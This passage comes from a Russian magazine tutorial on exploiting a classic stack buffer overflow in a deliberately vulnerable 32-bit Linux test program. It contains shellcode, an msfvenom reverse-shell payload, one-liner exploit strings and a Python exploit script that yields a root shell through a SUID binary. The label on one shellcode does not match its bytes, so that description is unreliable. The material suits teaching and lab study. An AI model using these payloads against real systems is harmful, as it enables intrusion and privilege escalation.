ячейка отводится под имя исполня емого файла), после чего значение самого
регистра кладется в стек. Ука затель на мас сив argv находится по сме‐
щению 12 (или 0xc) после адреса воз вра та и зна чения параметра argc.


0x0804842a <+15>: lea  eax,[ebp‐0x80]  ; eax = buf
0x0804842d <+18>: push eax            ; подготовить аргумент "dst"
для функции strcpy

Следом делается то же самое, но теперь для «наз начения» — аргу мент dst
из прототипа strcpy: в регистр EAX загружается эффективный адрес указате‐
ля на начало массива buf, а инс трукция lea (load eﬀective address) исполь‐
зуется для того, чтобы «на лету» вычислить смещение и помес тить его
в регистр.


0x0804842e <+19>: call 0x80482f0 <strcpy@plt>  ; strcpy(src, dst)
или strcpy(buf, argv[1])
0x08048433 <+24>: add  esp,0x8                 ; очистить стек от
двух крайних значений по 4 байта каждое

Теперь все готово: можно вызвать функцию strcpy и очистить стек от двух
не нужных более значений — src и dst.


0x08048436 <+27>: lea  eax,[ebp‐0x80]          ; eax = buf
0x08048439 <+30>: push eax                     ; подготовить
аргумент "buf" для функции printf
0x0804843a <+31>: push 0x80484d0               ; подготовить строку
формата "Input: %s\n"
0x0804843f <+36>: call 0x80482e0 <printf@plt>  ; printf("Input: %s\
n", buf)
0x08048444 <+41>: add  esp,0x8                 ; очистить стек от
крайнего значения

Далее идет во многом схожая подготовка аргу ментов для функции печати
введенной строки на экран.


0x08048447 <+44>: mov  eax,0x0  ; eax = 0x0

Регистр EAX канонично обну ляется перед воз вра том из функции.
   И, наконец, самое интересное — и во многом то, что делает возможным
изменение поведения программы, — эпилог.


0x0804844c <+49>: leave  ; mov esp,ebp; pop ebp
0x0804844d <+50>: ret    ; eip = esp

Здесь leave разворачивает ся не во что иное, как в цепочку из двух инструк‐
ций — mov esp,ebp; pop ebp. Этим действием мы в точности «откатываем»
то, что было сделано при создании стекового кадра: вершина стека вновь
указывает на значение, которое она содержала перед входом в функцию,
а EBP опять принимает зна чение EBP вызыва ющей функции. После этого
выпол няется инструкция ret, которая, в сущности, берет верхнее значение
стека, присваивает его регистру EIP, предполагая, что это сохраненный адрес
возврата в вызывающую функцию, переходит по этому адресу, не ожидая
недоброго, и все вер нулось бы на кру ги своя... Если бы здесь в игру не всту‐
пили мы.
  Однако прежде чем переходить непосредственно к разбору структуры
эксплоита, уделим внимание инстру менту отладки GDB, с помощью которого
был получен листинг ассемблера, и его модификации.


GDB (PEDA)
GDB (GNU Debugger) — инстру мент отладки, входящий в состав проекта GNU
и позволяющий работать со многими язы ками программирования, в том чис‐
ле с C и C++. В GDB реализован интерфейс интерактивной командной строки
как механизм взаимо действия с поль зователем, а некоторые энту зиасты
и вовсе умудряются исполь зовать этот инс трумент отладки, как REPL для язы‐
ка C.
  Признаться честно, я всегда чувс твовал себя несколько неуютно внутри
среды GDB из‐за отсутствия вспомога тельных данных «на фоне»: чтобы
вытащить любую крупицу информа ции (текущее состояние регистров, содер‐
жимое стека, активные точки оста нова и прочее), нужно ввести отдельную
команду, и несмотря на то, что практичес ки все команды в GDB име ют одно‐
буквенные алиасы, это бывает очень утомительно.
  К счастью, на помощь приходит рас ширение PEDA (Python Exploit Develop‐
ment Assistance  for GDB) — ассистент для GDB, написанный на Python,
который призван сделать отладчик чуть более дружественным. По названию
можно заметить, что используется ассистент в основном при разработке экс‐
плоитов для бинарных уязвимос тей.
   Устанавливается расширение в два клика: клонируем репозиторий и акти‐
вируем ассистент в кон фигура ционном файле GDB.



  $ git clone https://github.com/longld/peda.git ~/peda
  $ echo "source ~/peda/peda.py" >> ~/.gdbinit


checksec
В PEDA доступен такой замечательный модуль, как checksec. Он поможет
определить, какие механизмы безопас ности активны в данный момент
для данного исполняемого файла.





                       PEDA checksec

 • CANARY — защитник стека от перепол нения, который мы отключили нас‐
   тройкой fnostackprotector .
 • FORTIFY —  интеллектуальная  защита компилятора,  заключающаяся
   в проверке функций, которые в качестве аргументов при нимают небезо‐
   пасные структуры данных (раз мер которых задан статически, например
  массивы фик сированного размера). В процессе проверки компилятор
   заменяет вызовы таких функций на вызовы их специальных аналогов, уме‐
  ющих замечать выход за пределы границ допустимой памяти, и передает
  им максимально возможный раз мер для потенциально «небезопасного»
   аргумента. Если при этом была замечена перезапись «чужой» памяти,
   программа немедленно завершается.
 • NX — «неисполняемый» стек. Отключено настройкой z execstack.
 • PIE — позиционно‐независимый бинарник. Отключено настройкой no
  pie и неиспользованием защиты ASLR.
 • RELRO — режим «толь ко чтение» для таб лицы GOT. Отключено настройкой
  Wl,z,norelro.

Подобную проверку можно также провести и без использования этого рас‐
ширения для GDB, например с помощью скрипта.



РАЗРАБОТКА ЭКСПЛОИТОВ
Итак, пора что‐нибудь переполнить! Основная идея атаки срыва стека зак‐
лючается в перезаписи адреса возврата — того самого сохраненного зна‐
чения регистра EIP, по которо му будет совершен пры жок, когда отработает
уязвимая функция. В рамках рас сматриваемого кей са мы раз местим в стеке
вредоносный шелл‐код, рассчитаем его адрес и заменим им оригинальный
EIP.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
 В КОРОЛЕВСТВЕ PWN
           ПРЕПАРИРУЕМ КЛАССИКУ ПЕРЕПОЛНЕНИЯ
               БУФЕРА В СОВРЕМЕННЫХ УСЛОВИЯХ





Рассчитать сме щение EIP
Вычислить расположение адреса возврата в нашем случае можно и без
помощи каких‐либо инструментов, прос то изу чив низкоуровневый код.



  |       ...       |
  +‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐+
  |      Адрес      |
  |     возврата    |
  +‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐+
  |       EBP       |
  +‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐+
  |       buf       |
  +‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐+
  |    Свободное    |
  |  пространство   |
  +‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐+
  |       ...       |



Адрес_возврата = buf + EBP = 128 + 4 = 132

Однако существует способ автоматизировать этот процесс: он заключается
в генерации уникальной строки (паттерна) заданной длины, которая будет
скормлена уязвимой программе. Если таким образом нам удастся переза‐
писать EIP, то по значению, которое примет этот регистр, также с помощью
скрипта мы легко вычислим, сколько нужно байт, чтобы добраться до адреса
возврата.
  Существует несколь ко реализаций такого подхода. Первая из них —
это встроенный в PEDA модуль pattern. Команда pattern create <n>, где
n — требуемая длина, поз воляет соз дать уни каль ный паттерн.
  Запустим отладчик (с опцией ‐q для подавления вывода начального при‐
ветствия) и сгенерим строку в 200 байт, чтобы удос товериться, что перепол‐
нение точно произой дет.





              Генерация уникального пат терна в PEDA GDB

С помощью команды run <СТРОКА> (как я уже говорил, почти все команды
в GDB сокращаются до одной буквы для удобс тва, поэтому r — это run)
запустим программу на выполнение, передав в качестве аргумента сгенери‐
рованный паттерн.




                   Enter — и команда run будет выполнена

В результате увидим такое приятное глазу окно ассистента PEDA (чистый
GDB без «обвесов» был бы очень немногос ловен), в котором сразу видно,
какие значения приняли все важные для нас регистры. После чего, снова
используя модуль  pattern, рассчитаем смещение  как pattern  offset
0x6c414150, передав значение EIP, которое имел регистр на момент ошибки
сегментации.





             Расчет смещения до регистра EIP в PEDA GDB

Получили 132 — это означает, что мы были правы в нашем предположении
выше.


        WWW

                     Другие реализации таких инструментов можно
                      найти как в виде онлайновых сервисов  (Buffer
                      Overﬂow EIP Offset String Generator, Buffer over‐
                     ﬂow pattern generator), так и в виде отдельных
                       скриптов. Самый известный из них, пожалуй, вхо‐
                        дит в состав Metasploit.


Теперь у тебя есть информация о рас положении адреса возврата. Что даль‐
ше?
  Существует несколь ко вариантов размещения шелл‐кода в пространстве
стека, но сперва еще немного теории.

Шелл‑коды
В будущем эксплоите роль полезной нагрузки будет выпол нять шелл‐код —
набор машинных инструкций, представленных в шес тнадцатеричном виде,
позволяющий получить доступ к командно му интерпретатору и/или выполнить
иную последовательность действий, угодных нарушителю… То есть нам.
  Шелл‐коды можно:
 • написать самостоятельно;
 • найти в сети;
 • сгенерировать различным нас тупатель ным ПО.

Для нашего примера возьмем этот шелл‐код размером в 33 байта для Linux
x86. Он устанавливает действитель ный и эффективный идентификаторы
пользователя для вызывающего процес са равными нулю (root) и запускает
шелл.


// setreuid(0,0) + execve("/bin/sh", ["/bin/sh", NULL])


"\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89"
"\xe3\x52\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65"
"\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80"

Протестировать, что шелл‐код и правда выполнится в твоей системе, можно
с помощью простой программы на C.


// Использование: gcc ‐fno‐stack‐protector ‐z execstack ‐mprefe
rred‐stack‐boundary=2 ‐o test_shellcode_v1 test_shellcode_v1.c && ./
test_shellcode_v1


#include <stdio.h>
#include <string.h>


const unsigned char shellcode[] =
  "\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89"
  "\xe3\x52\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65"
  "\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80";


int main(int argc, char* argv[]) {
  printf("Shellcode size: %d\n\n", strlen((const char*)shellcode));


  int* ret;
  ret = (int*)&ret + 2;
  (*ret) = (int)shellcode;
}

Логика работы проста:
 1. объявление указателя на целое (переменная ret), который расположится
   в стековом фрейме main сра зу пос ле сох раненного значения EBP;
 2. смещение на 8 байт относитель но этой переменной для того, чтобы
   попасть на адрес возврата (+2 переместит нас точ но на 8 байт, так как мы
  имеем дело с типом указателя, который занимает 4 байта);
 3. перезапись адреса воз врата (EIP) адресом нашего шелл‐кода. Грубо
   говоря, происходит то же самое, что мы сделаем при эксплуатации
   переполнения — толь ко здесь все «легально».

Альтернативной реализацией может стать также код на C, в котором мы
будем интерпретировать мас сив, содержащий шелл‐код, как функцию —
и просто «вызовем» ее.


// Использование: gcc ‐fno‐stack‐protector ‐z execstack ‐mprefe
rred‐stack‐boundary=2 ‐o test_shellcode_v2 test_shellcode_v2.c && ./
test_shellcode_v2


#include <stdio.h>
#include <string.h>


const unsigned char shellcode[] =
  "\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89"
  "\xe3\x52\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65"
  "\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80";


int main(int argc, char* argv[]) {
  printf("Shellcode size: %d\n\n", strlen((const char*)shellcode));


  void (*fp)(void);
  fp = (void*)shellcode;
  fp();
}

Используй что нравится, а мы идем дальше.


По лез ная нагрузка до ESP
GDB позволяет использовать скрипты на Python из инте рактивного режима
для облегчения процесса отладки, поэтому с помощью простой питоновской
команды еще раз убе димся, что мы можем переза писать значение EIP на что
угодно.
  Для этого командой break я поставлю точ ку оста нова на инструкцию ret
(адрес 0x0804844d — см. лис тинг ассемблера).



  gdb‐peda$ b *0x0804844d


После чего выпол ню программу, передав в качестве аргу мента строку
из 132 символов «A» (мусор, чтобы доб раться до адреса возврата), кон‐
катенированную со зловещим зна чением 0xd34dc0d3 («мертвый код»). Помня
о  little endian, я разворачиваю строку, содержащую адрес, с помощью
питоновского механизма работы со срезами [::‐1].



  gdb‐peda$ r `python ‐c 'print "A"*132 + "\xd3\x4d\xc0\xd3"[::‐1]'`





        Смот рим значение регистров в точке оста нова перед ret

Так как мы остановились перед выполнением ret, значение «мертвый код»
находится на вершине стека (выделено красным), то есть в ESP, отку да он
попал бы в регистр EIP, если бы мы не прервали выполнение. Также обрати
внимание, что сейчас EIP равен той самой точке оста нова (выделено синим).
  Командой x (от examine) ты можешь получить более наглядное представ‐
ление о любом участке памяти, например о том, что творится сейчас в начале
стекового фрейма ($esp‐132), и в уме раз метить его пространство, чтобы
лучше понимать, как шелл‐код «ляжет» на стек. Через слеш я укажу формат,
в котором хочу получить результат: 64wx для зап роса 64‐х 4‐хбайтных слов (w)
в шестнадцатерич ном виде (x).



  gdb‐peda$ x/64wx $esp‐132





       Ожидаемое запол нение стека после загрузки шелл‐кода

Давай разберем ся, что я здесь изоб разил.
 • Пока все, что находится до значения 0xd34dc0d3 в красной рамке, —
   это мусор из символов «A», на мес то которых вскоре ляжет нечто более
   интересное.
 • Оранжевым выделена область, в которой будет раз мещен шелл‐код
   (33 байта). Обрати внимание, что в последнем слове (адрес 0xbfffee18)
   захватится наименьший зна чащий байт — все так же из‐за порядка байтов
     little endian.
 • Шелл‐код окружают синие области по 32 байта каждая — это так называ‐
  емые NOP‐срезы (NOP sled), исполь зуемые для того, чтобы не вымерять
   адрес шелл‐кода с точностью до байта: сегменты, состоящие из инструк‐
   ций NOP (no operation, код 0x90 для семей ства архитектур Intel x86), пред‐
   писывающих процес сору в буквальном смысле «ничего не делать», могут
   использоваться нарушителем для возможности «прыгнуть» на участок
   такого сегмента и «проскользить» до места расположения шелл‐кода.
   Таким образом умень шает ся вероятность указать неверный адрес —
   полезная нагрузка все равно будет выполнена. Также в частых случаях
   в современных системах бывает просто невоз можно однозначно задать
   статический адрес, однажды его рассчитав, и надеяться, что при каждом
   следующем запуске программы он оста нется неизменным (здесь играет
   роль и ASLR, и тонкости работы компилятора при выравнивании стека,
   к которым мы еще вернемся). Что каса ется области NOP «за» шелл‐кодом,
   то она скорее служит своего рода «заполнителем» свободного места
   (примерно как мусор из символов «A»), чтобы можно было добраться
   до интересующего нас значения. Кро ме того, считается хорошим тоном
   (если место позволяет) оставлять небольшой NOP‐срез после инжекта
   шелл‐кода на случай, если ему понадобится место для «расширения»
   в процессе исполнения.
 • Зеленым выделено заполнение стека junk‐символами «A»:


   35 байт = (EBP + buf) ‐ NOP_срез*2 ‐ Шелл_код = (128 + 4) ‐ 32*2
   ‐ 33

Продолжив выпол нение командой continue, мы триггерим выполнение инс‐
трукции ret, программа ожидаемо крашится с ошиб кой сегментации, и адрес
возврата слов но по волшебству превращается в ожидаемый 0xd34dc0d3.



  gdb‐peda$ c





               Продолжение выполнения программы

Теперь можно приступать к боевым действиям. Грубый эксплоит для выпол‐
нения из интерактивной обо лочки GDB выглядит так (чуть позже сделаем
это более красиво и без необходимости запускать отладчик).



  gdb‐peda$ r `python ‐c 'print "\x90"*32 + "\x6a\x46\x58\x31\xdb\x31\xc9\
  xcd\x80\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\
  x89\xe3\x52\x53\x89\xe1\xcd\x80" + "\x90"*32 + "A"*35 + "\xbf\xff\xed\
  xe8"[::‐1]'`


Адрес, который перезаписывает  EIP, — 0xbfffede8: мы пры гаем ровно
на середину NOP‐среза (см. рисунок заполнения стека).
   Теперь я сменю владель ца исполня емого файла и группу на root, присвою
ему бит SUID, чтобы вызов setreuid(0,0) (из шелл‐кода) имел смысл,
и выполню команду выше из‐под отладчика.



  $ sudo chown root overflow
  $ sudo chgrp root overflow
  $ sudo chmod +s overflow





               Спаун шелла и выполнение команды id

Таким образом мы соз дали новый процесс, в котором запустился шелл
/bin/dash  (dash, кстати, в Debian и Ubuntu заменил собой старинный
/bin/sh,  который, в свою очередь, превратился лишь в симлинк на
/bin/dash).
  Выполнив команду id, видим, что мы все еще работаем с правами обыч‐
ного пользовате ля — дело здесь в том, что GDB не уважает бит SUID, только
если он сам не запущен от имени root, поэтому сес сию суперпользователя
мы получим только тогда, когда выполним экс плуатацию без участия отладчи‐
ка.


По лез ная нагрузка после ESP
Если бы нам не хватило памяти для расположения шелл‐кода в пре делах
«официально» выделен ного буфера мас сива buf, то можно было бы поп‐
робовать захватить кусок «ничьей» памяти, находя щейся за вершиной стека.
Однако здесь все очень ситуационно, и раз мер области памяти, которую
было бы допустимо использовать без серь езных пос ледствий, непредска‐
зуем и зависит только от текущего состояния машины.
  К примеру, если я передаю строку из 1000 дополнительных байт после
перезаписи адре са возврата, то ловлю ошиб ку неизвестной природы из фун‐
кции ptmalloc_init.





             Ошибка при перезаписи чужой памяти

Произошло это из‐за того, что я беспардонно вторгся на территорию области
памяти, с которой уже работали дру гие функции, и начал наводить там свои
порядки — перезаписывать значения своими данными. GDB использует
вспомогательные библиотеки для вывода более информативных сообщений
об ошибках в случаях, когда прог рамма пада ет. Если временно отключить
использование этих библиотек (в нашем вари анте они все равно не слишком
полезны), можно убедить ся, что разделяемая биб лиоте ка стандартных фун‐
кций С libc жалуется на то, что мы затронули уже занятую ей память.



  gdb‐peda$ show debug‐file‐directory  // смотрим, какая директория содер‐
  жит библиотеки с информацией для дебага
  The directory where separate debug symbols are searched for is "/usr/
  lib/debug".
  gdb‐peda$ set debug‐file‐directory  // временно отключаем ее исполь‐
  зование





            Ошибка при перезаписи чужой памяти (libc)

Методом «Пол, Палец, Потолок» выяс няем, что при перезаписи 160 бай тов
за пределами сте ка ничего пло хого не про исходит.



  gdb‐peda$ r `python ‐c 'print "A"*132 + "\xd3\x4d\xc0\xd3"[::‐1] +
  "B"*160'`





          При передаче 160 байт за стек программа не падает

Поэтому ради разнооб разия сгенерируем пейлоад с помощью метаспло‐
итовского msfvenom и посмотрим на заполнение стека при таком раз‐
мещении шелл‐кода.
  Для этого переместимся на Kali и пос мотрим список доступных полезных
нагрузок для Linux x86, которые не ориентируются на использование meter‐
preter (его в нашем распоряжении на Ubuntu нет).





            Список пейлоадов для Linux x86 без meterpreter

Я выбрал реверс‐шелл linux/x86/shell_reverse_tcp. Сгенерируем его,
указав в качестве жертвы localhost на 1337 порту и закодировав нагрузку
с помощью энкодера x86/shikata_ga_nai для увеличе ния размера кода.



  root@kali:~# msfvenom ‐p linux/x86/shell_reverse_tcp ‐e x86/shikata_ga_‐
  nai ‐a x86 ‐‐platform linux LHOST=127.0.0.1 LPORT=1337 ‐f c
  Found 1 compatible encoders
  Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
  x86/shikata_ga_nai succeeded with size 95 (iteration=0)
  x86/shikata_ga_nai chosen with final size 95
  Payload size: 95 bytes
  Final size of c file: 425 bytes
  unsigned char buf[] =
  "\xbe\xaf\x6c\xe1\x7e\xd9\xe5\xd9\x74\x24\xf4\x5f\x31\xc9\xb1"
  "\x12\x83\xc7\x04\x31\x77\x0e\x03\xd8\x62\x03\x8b\x17\xa0\x34"
  "\x97\x04\x15\xe8\x32\xa8\x10\xef\x73\xca\xef\x70\xe0\x4b\x40"
  "\x4f\xca\xeb\xe9\xc9\x2d\x83\x96\x29\xce\x52\x01\x28\xce\x51"
  "\xe8\xa5\x2f\xe9\x6c\xe6\xfe\x5a\xc2\x05\x88\xbd\xe9\x8a\xd8"
  "\x55\x9c\xa5\xaf\xcd\x08\x95\x60\x6f\xa0\x60\x9d\x3d\x61\xfa"
  "\x83\x71\x8e\x31\xc3";


На языке питонов ских однос трочников эксплоит будет выглядеть так.


python ‐c 'print "A"*132 + "\xbf\xff\xed\xcc"[::‐1] + "\x90"*32 + "\
xbe\xaf\x6c\xe1\x7e\xd9\xe5\xd9\x74\x24\xf4\x5f\x31\xc9\xb1\x12\x83\
xc7\x04\x31\x77\x0e\x03\xd8\x62\x03\x8b\x17\xa0\x34\x97\x04\x15\xe8\
x32\xa8\x10\xef\x73\xca\xef\x70\xe0\x4b\x40\x4f\xca\xeb\xe9\xc9\x2d\
x83\x96\x29\xce\x52\x01\x28\xce\x51\xe8\xa5\x2f\xe9\x6c\xe6\xfe\x5a\
xc2\x05\x88\xbd\xe9\x8a\xd8\x55\x9c\xa5\xaf\xcd\x08\x95\x60\x6f\xa0\
x60\x9d\x3d\x61\xfa\x83\x71\x8e\x31\xc3" + "\x90"*32 + "A"'

А стек после внедрения шелл‐кода примет следующий вид.





             Запол нение стека после загрузки шелл‐кода

Здесь практически все то же самое, что и на первом рисунке анализа стека,
кроме того, что полезная наг рузка теперь находится после ESP. Но при этом
мы также «прыгаем» ров но на середину предваря ющего шелл‐код NOP‐среза
(адрес 0xbfffedcc), а зеленым снова выделено заполнение стека junk‐сим‐
волами «A»:


1 байт = доступная_память_после_ESP ‐ NOP_срез*2 ‐ шелл_код = 160 ‐
32*2 ‐ 95

Оставив локального слу шателя на 1337 порту, я запустил программу, подав
на вход вредоносную строку, и получил свой шелл.





                  nc ловит реверс‐шелл на 1337 порту



                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
 В КОРОЛЕВСТВЕ PWN
           ПРЕПАРИРУЕМ КЛАССИКУ ПЕРЕПОЛНЕНИЯ
               БУФЕРА В СОВРЕМЕННЫХ УСЛОВИЯХ





Экспло ит без GDB
При работе программы не из‐под отладчика адреса используемой памяти
смещаются, поэтому вредоносная строка не сра ботает без корректировки
адреса возврата. Что бы узнать новое зна чения интересующе го нас адреса,
воспользуемся дампом ядра.
  Начиная с релиза 16.04 в Ubuntu по умолчанию используется кошмарный
сервис Apport для управления созданием отчетов о падении программ, вклю‐
чая дампы ядра. Кошмарный, потому что он не дает управлять конфигурацией
дампов привычными способами, поэто му для начала избавимся от него.



  $ sudo vi /etc/default/apport  # установить значение "enabled" в "0"
  $ sudo systemctl stop apport


После этого внесем небольшие изменения в стандартное поведение соз‐
дания дампов (первые три команды должны быть выполнены от имени su).



  # echo 1 > /proc/sys/kernel/core_uses_pid
  # echo '/tmp/core‐%e‐%s‐%u‐%g‐%p‐%t' > /proc/sys/kernel/core_pattern
  # echo 2 > /proc/sys/fs/suid_dumpable
  $ ulimit ‐c unlimited


Что здесь происходит по строкам:
 1. установка «безлимита» на раз мер соз дава емых дампов;
 2. добавление к имени файла дампа PID процесса;
 3. изменение общего шаблона имени файла дампа (описание форматов
  можно найти в мануале core);
 4. вклю чение создания дампов для исполня емых файлов с битом SUID.

Далее я «уроню» нашу программу (на этот раз уже из терминала) с помощью
Python, передав на вход ту самую диагностичес кую строку c «мертвым кодом»
в качестве адреса возврата.



  $ ./overflow python ‐c 'print "A"*132 + "\xd3\x4d\xc0\xd3"[::‐1]'
  Input:
  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM
  Ошибка сегментирования (сделан дамп памяти)


Согласно заданному шаблону имени дамп сохранился в директории /tmp.
Запустим отладчик, указав путь до файла, содержащего дамп.



  $ gdb ./overflow /tmp/core‐overflow‐11‐1000‐1000‐8767‐1568120200 ‐q


И проведем ров но те же самые манипуляции, которые я описал выше, когда
мы в первый раз рассчитывали рас положение шелл‐кода. В моем слу чае, что‐
бы   снова   «прыгнуть»   на  середи ну  NOP‐среза,   рас положенного
перед шелл‐кодом, мне пот ребова лось изменить адрес возврата на 0xbff‐
fee2c.
   Таким образом, у нас есть все для создания красивого скрипта для PWN
рассматриваемой уязвимос ти.


#!/usr/bin/env python
# ‐*‐ coding: utf‐8 ‐*‐


# Использование: python exploit.py


import struct
from subprocess import call



def little_endian(num):
  """Упаковка адреса в формат little endian."""
  return struct.pack('<I', num)



junk     = 'A' * 35                   # мусор из символов "A"
nop_sled = '\x90' * 32                # NOP‐срез
ret_addr = little_endian(0xbfffee2c)  # адрес возврата


# setreuid(0,0) + execve("/bin/sh", ["/bin/sh", NULL])
shellcode = '\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\x31\xd2\x6a\x0b\
x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\
xe1\xcd\x80'


payload  = nop_sled
payload += shellcode
payload += nop_sled
payload += junk
payload += ret_addr


try:
  call(['./overflow', payload])  # выполнится в случае, если был
импорт функции call (7‐я строка)
except NameError:
  print payload  # выполнится в противном случае

По умолчанию экспло ит самос тоятельно вызовет программу с необходимым
аргументом, однако если нуж но вручную передать вредонос, дос таточно
закомментировать седьмую строку скрипта, содержащую импорт call.



  $ python exploit.py
  Input: jFX111j
  XRh//shh/binRSAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  # id
  uid=0(root) gid=1000(snovvcrash) groups=1000(snovvcrash),4(adm),24(
  cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)


Вот здесь уже сыграло роль то, что ранее мы присвоили бинарнику бит
SUID — шелл  получен с привилегиями  root без использования sudo
при запуске программы.
  Для написания подоб ного рода скриптов лучше пользоваться второй вер‐
сией Python в силу особенностей работы с кодировками для строкового типа
данных. К тому же на Python 2 написан самый популярный модуль, облегча‐
ющий эксплуатацию бинарных уязвимос тей, — pwntools. К сожале нию, pwn‐
tools не работает на дистрибутивах 32‐битной архитектуры, поэтому оставим
его использование до часа экс плуатации 64‐битных бинарей.


ОБХОД НОВОГО ПРОЛОГА ФУНКЦИИ MAIN
Готовя эту статью, я заметил, что одним из час то задаваемых вопросов
от людей, которые проходят уроки по переполнению буфера, является воп‐
рос, связанный с (относитель но) новым прологом функции main компилятора
GCC для Linux, который пришел вмес те с необ ходимостью выравнивать стек
по 16‐байтовой границе (требуется для корректной работы сета инс трукций
SSE2).
   Так как ни одного доступного примера кода для переполнения в таких
условиях я не нашел, в этом параграфе раз берем особенности ассемблер‐
ного кода, который получается в том случае, когда при компиляции мы
не меняем дефолтное выравнивание с помощью опции ‐mpreferred‐stack‐
boundary, и разработаем для него экс плоит.


Те ория
Если не использовать флаг ‐mpreferred‐stack‐boundary=2 (см. начало
статьи), то результат будет таким же, как при использовании ‐mpreferred‐
stack‐boundary=4 —  стековый фрейм функции main  будет выровнен
на 16 байт.
  Пересоберем программу и запросим листинг ассемблера.



  $ gcc ‐g ‐Wall ‐Werror ‐O0 ‐m32 ‐fno‐stack‐protector ‐z execstack ‐no‐
  pie ‐Wl,‐z,norelro ‐o overflow overflow.c
  $ gdb ‐batch ‐ex 'file ./overflow' ‐ex 'disas main'



Dump of assembler code for function main:
   0x0804841b <+0>:     lea    ecx,[esp+0x4]
   0x0804841f <+4>:     and    esp,0xfffffff0
   0x08048422 <+7>:     push   DWORD PTR [ecx‐0x4]
   0x08048425 <+10>:    push   ebp
   0x08048426 <+11>:    mov    ebp,esp
   0x08048428 <+13>:    push   ecx
   0x08048429 <+14>:    sub    esp,0x84
   0x0804842f <+20>:    mov    eax,ecx
   0x08048431 <+22>:    mov    eax,DWORD PTR [eax+0x4]
   0x08048434 <+25>:    add    eax,0x4
   0x08048437 <+28>:    mov    eax,DWORD PTR [eax]
   0x08048439 <+30>:    sub    esp,0x8
   0x0804843c <+33>:    push   eax
   0x0804843d <+34>:    lea    eax,[ebp‐0x88]
   0x08048443 <+40>:    push   eax
   0x08048444 <+41>:    call   0x80482f0 <strcpy@plt>
   0x08048449 <+46>:    add    esp,0x10
   0x0804844c <+49>:    sub    esp,0x8
   0x0804844f <+52>:    lea    eax,[ebp‐0x88]
   0x08048455 <+58>:    push   eax
   0x08048456 <+59>:    push   0x80484f0
   0x0804845b <+64>:    call   0x80482e0 <printf@plt>
   0x08048460 <+69>:    add    esp,0x10
   0x08048463 <+72>:    mov    eax,0x0
   0x08048468 <+77>:    mov    ecx,DWORD PTR [ebp‐0x4]
   0x0804846b <+80>:    leave
   0x0804846c <+81>:    lea    esp,[ecx‐0x4]
   0x0804846f <+84>:    ret
End of assembler dump.

Разберем его по частям. Во‐первых, видим, что пролог по сравнению со ста‐
рым вариантом вырос до семи строк.


0x0804841b <+0>:  lea  ecx,[esp+0x4]        ; бэкап оригинального
значения ESP в ECX
0x0804841f <+4>:  and  esp,0xfffffff0       ; выравнивание
0x08048422 <+7>:  push DWORD PTR [ecx‐0x4]  ; сохранение адреса
возврата
0x08048425 <+10>: push ebp
0x08048426 <+11>: mov  ebp,esp
0x08048428 <+13>: push ecx                  ; сохранение
оригинального значения ESP
0x08048429 <+14>: sub  esp,0x84

Основное различие — в инструкции and esp,0xfffffff0, которая вырав‐
нивает вершину стека таким образом, чтобы она была кратна 16. Но если так
грубо обойтись с ESP, то как же тог да вернуть его первоначальное значение
в эпилоге?
  Для этого оригинальное значение копируется в регистр ECX и сохраняется
в стеке дважды:
 1. Сначала инструкция lea уста навливает ECX на аргумент argc (ESP+4)
  функции main, после чего в стек пушится ECX‐4. Это то же самое, что
   и ESP, так как ECX4 = (ESP+4)4  =  ESP. Таким образом в стек
  помещается адрес воз вра та.
 2. Далее после уже зна комой нам час ти ори гинального пролога (push ebp;
  mov ebp,esp) ECX снова пушится в стек для того, чтобы в конце инс трук‐
   ция leave смогла вос ста новить его прежнее значение при завершении
   работы  функции.  Также  следует  обра тить  внимание,  что  теперь
   для буфера  выделилась  дополнительная  память  (0x84  байт  вмес‐
   то 0x80) — опять же с целью не конфликтовать с новым выравниванием.

Между прологом и эпилогом все оста лось практичес ки так же, как в первом
случае — за исклю чением того, что теперь обра щение к аргу ментам main
осуществляется по смещению отно сительно регис тра ECX.
   Что касается эпилога, то здесь добавилась всего одна новая инструк‐
ция — восстановление оригинального значения регистра ESP для успешного
возврата из функции инс трукцией ret.


0x0804846b <+80>: leave                 ; mov esp,ebp; pop ebp
0x0804846c <+81>: lea    esp,[ecx‐0x4]  ; восстановление
оригинального значения ESP
0x0804846f <+84>: ret                   ; eip = esp

К слову, такой пролог специфичен толь ко для главной функции main. Если бы
в нашей программе были еще функции, то груз ответственности за вырав‐
нивание их стековых фреймов лег бы на плечи вызывающей функции (то есть
main), а у вызываемых функций были бы классические прологи и эпилоги.
   Из‐за дополнительного значения регистра ECX, которое должно быть
куда‐то сохранено, рисунок, демонстрирующий устройство стека для функции
main, изменится.





  Размещение данных в стеке для функции main overﬂow.c с выравнивани‐
  ем по 16‐байтной границе

Посмотрим, как эти изменения ска жутся на экс плуата ции.


Прак тика
